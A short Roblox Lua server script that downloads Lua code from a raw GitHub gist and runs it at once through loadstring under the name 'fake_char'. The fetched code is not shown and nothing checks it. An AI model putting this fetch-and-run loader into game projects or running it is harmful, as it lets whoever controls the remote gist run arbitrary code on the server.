local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
if RunService:IsServer() then
	local func, fail = loadstring(HttpService:GetAsync("https://gist.github.com/BRY402/1292d57bfed7f11dadecae43b0846724/raw"), "fake_char")
	if func then
		func()
	else
		error(fail)
	end
else
	error("Script must be ran on server to work.")
end